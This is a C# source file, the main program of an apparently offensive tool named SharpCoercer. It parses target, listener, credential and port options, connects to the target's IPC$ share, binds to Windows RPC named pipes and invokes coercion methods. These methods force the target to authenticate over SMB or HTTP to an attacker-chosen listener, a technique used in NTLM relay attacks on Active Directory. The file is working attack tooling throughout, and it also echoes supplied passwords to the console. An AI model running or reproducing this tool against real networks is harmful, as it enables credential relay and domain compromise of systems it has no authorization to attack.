using SharpCoercer.Abstracts;
using SharpCoercer.Helpers;
using SharpCoercer.RpcClients;
using SharpCoercer.Win32.Structs;
using System;
using System.Linq;
using System.Runtime.InteropServices;

namespace SharpCoercer
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // Incoming args
            string domain = null;
            string username = null;
            string password = null;
            string target = null;
            string listener = null;
            string methodFilter = null;
            string rpcFilter = null;
            string pipeFilter = null;
            // New: Auth type and ports
            string authType = "smb";               // "smb" or "http"
            int smbPort = 445;                      // Default SMB port
            int httpPort = 80;                      // Default HTTP port

            bool listRpcs = false;
            bool listFuncs = false;
            bool alwaysCont = false;
            bool listPipes = false;
            bool enumerateTarget = false;
            // Parse arguments
            for (int i = 0; i < args.Length; i++)
            {
                var arg = args[i].ToLower();
                switch (arg)
                {
                    case "-d":
                    case "-domain":
                        domain = GetNextArg(args, ref i, arg);
                        break;
                    case "-u":
                    case "-username":
                        username = GetNextArg(args, ref i, arg);
                        break;
                    case "-p":
                    case "-password":
                        password = GetNextArg(args, ref i, arg);
                        break;
                    case "-t":
                    case "-target":
                        target = GetNextArg(args, ref i, arg);
                        break;
                    case "-l":
                    case "-listener":
                        listener = GetNextArg(args, ref i, arg);
                        break;
                    case "-m":
                    case "-method-filter":
                        methodFilter = GetNextArg(args, ref i, arg);
                        break;
                    case "-r":
                    case "-rpc-filter":
                        rpcFilter = GetNextArg(args, ref i, arg);
                        break;
                    case "-np":
                    case "-namedpipe-filter":
                        pipeFilter = GetNextArg(args, ref i, arg);
                        break;
                    case "-a":
                    case "-auth-type":
                        authType = GetNextArg(args, ref i, arg).ToLower();
                        break;
                    case "-sp":
                    case "-smb-port":
                        smbPort = int.Parse(GetNextArg(args, ref i, arg));
                        break;
                    case "-hp":
                    case "-http-port":
                        httpPort = int.Parse(GetNextArg(args, ref i, arg));
                        break;
                    case "-listrpcs":
                    case "-lr":
                        listRpcs = true;
                        break;
                    case "-listfunctions":
                    case "-lf":
                        listFuncs = true;
                        break;
                    case "-listPipes":
                    case "-lp":
                        listPipes = true;
                        break;
                    case "-always-continue":
                    case "-c":
                        alwaysCont = true;
                        break;
                    case "-enumerate":
                    case "-e":
                        enumerateTarget = true;
                        break;
                    default:
                        Console.WriteLine($"Unknown switch: {args[i]}");
                        PrintUsage();
                        return;
                }
            }

            // Validate authType
            if (authType != "smb" && authType != "http")
            {
                Console.WriteLine("[-] ERROR: Invalid auth-type. Must be 'smb' or 'http'.");
                PrintUsage();
                return;
            }

            // get all RPC clients from the assembly
            // get onle IRpcClient instances which has empty constructor
            var allClients = AssemblyHelper.GetInsancesOf<IRpcClient>();


            //list RPC clients or methods if requested
            if (listRpcs)
            {
                Console.WriteLine("Available RPC Clients:");
                foreach (var c in allClients.DistinctBy(x=>x.Name))
                    Console.WriteLine($"  - {c.Name}");
                return;
            }

            //list named pipes if requested
            if (listPipes)
            {
                Console.WriteLine("Available Pipes:");
                foreach (var c in allClients)
                    Console.WriteLine($"  - {c.GetPipeName().ToLower()}");
                return;
            }
            //list RPC methods if requested
            if (listFuncs)
            {
                var clients = string.IsNullOrEmpty(rpcFilter)
                    ? allClients
                    : allClients.Where(r => r.Name.IndexOf(rpcFilter, StringComparison.OrdinalIgnoreCase) >= 0);

                Console.WriteLine("Available RPC Methods:");
                foreach (var rpc in clients.DistinctBy(x=>x.Name))
                {
                    Console.WriteLine($"\n[{rpc.Name}] ({rpc.Description})");
                    foreach (var f in rpc.GetFunctions())
                        Console.WriteLine($"  - {f.Name}");
                }
                return;
            }

            // Validate required
            if ((!enumerateTarget && string.IsNullOrEmpty(listener)) || string.IsNullOrEmpty(target))
            {
                Console.WriteLine("[-] ERROR: /listener and /target are required.");
                PrintUsage();
                return;
            }
            if (!string.IsNullOrEmpty(username) && string.IsNullOrEmpty(domain))
            {
                Console.WriteLine("[-] ERROR: /domain is required when /username is provided.");
                PrintUsage();
                return;
            }

            // Show selected settings
            Console.WriteLine($"[+] Using auth-type: {authType.ToUpper()}, SMB port: {smbPort}, HTTP port: {httpPort}");
            if (!string.IsNullOrEmpty(username))
            {
                var credMsg = password != null
                    ? $"{domain}\\{username}:{password}"
                    : $"{domain}\\{username} (no password)";
                Console.WriteLine($"[+] Using credentials: {credMsg}");
            }
            else
            {
                Console.WriteLine("[!] No credentials provided, using current security token.");
            }

            // Connect IPC 
            // Some RPC clients require IPC$ connection to work properly
            if (!IpcConnectorHelper.ConnectToIpc(target, domain, username, password))
                return;

            bool isHttp = authType == "http";
            // Run RPC clients
            var rpcs = allClients
                .Where(r => string.IsNullOrEmpty(rpcFilter)
                            || r.GetType().Name.IndexOf(rpcFilter, StringComparison.OrdinalIgnoreCase) >= 0)
                .ToList();

            foreach (var rpc in rpcs)
            {
                var funcs = rpc.GetFunctions()
                       .Where(f => string.IsNullOrEmpty(methodFilter)
                              || f.Name.IndexOf(methodFilter, StringComparison.OrdinalIgnoreCase) >= 0);

                if (!funcs.Any())
                    continue;

                if (!string.IsNullOrEmpty(pipeFilter) && rpc.GetPipeName().IndexOf(pipeFilter) == -1)
                    continue;




                Console.WriteLine($"\n== {rpc.Name} ==");
                if (!NamedPipeUtils.RemotePipeExists(target, rpc.GetPipeName()))
                {
                    Console.WriteLine($"[-] Pipe {rpc.GetPipeName()} missing on {target}, skipping");
                    continue;
                }
                Console.WriteLine($"[+] Found pipe {rpc.GetPipeName()} on {target}");
             
                if (!rpc.HttpCoerce && isHttp) 
                {
                    Console.WriteLine("[!] skipping {0} doesn't support http coercion",rpc.Name);
                    continue;
                }
                

          
               
                //set authentication details before binding
                rpc.SetAuthenticationDetails(domain, username, password);

                
                // Bind to the RPC server
                IntPtr hBind = rpc.GetType().Name == nameof(RprnRpcClient)
                    ? IntPtr.Zero
                    : rpc.Bind(Marshal.StringToHGlobalUni(target));
                if (enumerateTarget)
                {
                    continue;
                }
                //interact with the RPC methods
                foreach (var func in funcs)
                {
                    func.Coerce(hBind, target, listener, smbPort, httpPort, isHttp);
                    if (!alwaysCont)
                    {
                        Console.WriteLine();
                        Console.Write("  [C] Continue to next call   [E] Exit: ");
                        while (true)
                        {
                            var key = Console.ReadKey(true).Key;
                            if (key == ConsoleKey.C)
                            {
                                Console.WriteLine(" ? Continuing...\n");
                                break;
                            }
                            else if (key == ConsoleKey.E)
                            {
                                Console.WriteLine(" ? Exiting.");
                                return;
                            }
                        }
                    }
                }
            }
        }

        static string GetNextArg(string[] args, ref int idx, string flag)
        {
            if (idx + 1 >= args.Length)
            {
                Console.WriteLine($"ERROR: Expected value after '{flag}'");
                PrintUsage();
                Environment.Exit(-1);
            }
            return args[++idx];
        }

        static void PrintUsage()
        {
            Console.WriteLine(@"Usage: SharpCoercer.exe
  -target            <host/IP>   or -t   <host/IP>
  -listener          <host/IP>   or -l   <host/IP>
  -auth-type         <smb|http>  or -a   <smb|http>  (default smb)
  -smb-port          <port>      or -sp  <port>      (default 445)
  -http-port         <port>      or -hp  <port>      (default 80)
[Optional]
  -domain            <domain>    or -d   <domain>
  -username          <user>      or -u   <user>
  -password          <pass>      or -p   <pass>
  -namedpipe-filter  <name>      or -np  <name>
  -method-filter     <name>      or -m   <name>
  -rpc-filter        <name>      or -r   <name>
  -listrpcs        ? list RPC clients       or -lr
  -listfunctions   ? list RPC methods       or -lf
  -always-continue ? skip ReadKey pauses    or -c
  -enumerate        ? enumerate available rpcs on the target or -e"
  );
        }
    }
}
